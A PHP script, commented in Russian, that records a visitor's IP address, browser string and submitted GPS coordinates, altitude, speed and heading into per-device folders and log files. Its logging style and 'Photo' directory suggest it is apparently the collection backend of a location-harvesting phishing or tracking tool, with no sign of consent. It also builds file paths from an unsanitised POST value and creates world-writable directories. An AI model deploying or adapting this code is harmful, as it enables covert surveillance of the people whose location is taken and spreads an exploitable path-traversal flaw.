<?php

// Универсальная функция для получения IP адреса
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Получение User-Agent для идентификации устройства
function getUserAgent() {
    return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
}

$clientIP = getClientIP();
$userAgent = getUserAgent();

// Получаем геолокацию из POST данных
$locationData = null;
if (isset($_POST['location_data'])) {
    $locationData = json_decode($_POST['location_data'], true);
}

// Создаем уникальный идентификатор (IP или телефон)
$deviceId = isset($_POST['device_id']) ? $_POST['device_id'] : preg_replace('/[^a-zA-Z0-9]/', '_', $clientIP);

// Путь к папке Photo с подпапкой для устройства
$basePhotoDir = 'Photo';
$photoDir = $basePhotoDir . '/' . $deviceId . '/';

// Создаем директорию, если она не существует
if (!file_exists($photoDir)) {
    mkdir($photoDir, 0777, true);
}

// Сохраняем информацию о геолокации
$geoFile = $photoDir . 'gps_location.txt';
$geoInfo = "=== GPS Location Data ===\n";
$geoInfo .= "Time: " . date('Y-m-d H:i:s') . "\n";
$geoInfo .= "IP: $clientIP\n";
$geoInfo .= "Device: $deviceId\n";
$geoInfo .= "User-Agent: $userAgent\n";

if ($locationData) {
    $geoInfo .= "Latitude: " . ($locationData['lat'] ?? 'N/A') . "\n";
    $geoInfo .= "Longitude: " . ($locationData['lon'] ?? 'N/A') . "\n";
    $geoInfo .= "Accuracy: " . ($locationData['accuracy'] ?? 'N/A') . " meters\n";
    if (isset($locationData['altitude'])) {
        $geoInfo .= "Altitude: " . $locationData['altitude'] . " meters\n";
    }
    if (isset($locationData['heading'])) {
        $geoInfo .= "Heading: " . $locationData['heading'] . " degrees\n";
    }
    if (isset($locationData['speed'])) {
        $geoInfo .= "Speed: " . $locationData['speed'] . " m/s\n";
    }
    if (isset($locationData['timestamp'])) {
        $geoInfo .= "Timestamp: " . date('Y-m-d H:i:s', $locationData['timestamp'] / 1000) . "\n";
    }
    $geoInfo .= "---\n";
}

file_put_contents($geoFile, $geoInfo, FILE_APPEND);

// Логируем в файл активности
$log_entry = "[" . date('Y-m-d H:i:s') . "] GPS Location received from IP: $clientIP | Device: $deviceId | Lat: " . ($locationData['lat'] ?? 'N/A') . " | Lon: " . ($locationData['lon'] ?? 'N/A') . "\n";
file_put_contents('activity.log', $log_entry, FILE_APPEND);

// Логируем GPS геолокацию в отдельный файл для геолокации (в том же формате)
$geo_log_entry = "[" . date('Y-m-d H:i:s') . "] [+] GPS Геолокация:" . "\n";
$geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] IP: $clientIP" . "\n";
$geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] Устройство: $userAgent" . "\n";
if ($locationData) {
    $geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] GPS Координаты: " . ($locationData['lat'] ?? 'N/A') . ", " . ($locationData['lon'] ?? 'N/A') . "\n";
    $geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] Точность GPS: " . ($locationData['accuracy'] ?? 'N/A') . "м" . "\n";
    if (isset($locationData['altitude']) && $locationData['altitude'] !== null) {
        $geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] Высота: " . $locationData['altitude'] . "м" . "\n";
    }
    if (isset($locationData['speed']) && $locationData['speed'] !== null) {
        $geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] Скорость: " . $locationData['speed'] . " м/с" . "\n";
    }
    if (isset($locationData['heading']) && $locationData['heading'] !== null) {
        $geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] [+] Направление: " . $locationData['heading'] . "°" . "\n";
    }
}
$geo_log_entry .= "[" . date('Y-m-d H:i:s') . "] ---" . "\n";
file_put_contents('logs_location.log', $geo_log_entry, FILE_APPEND);

exit();

?>

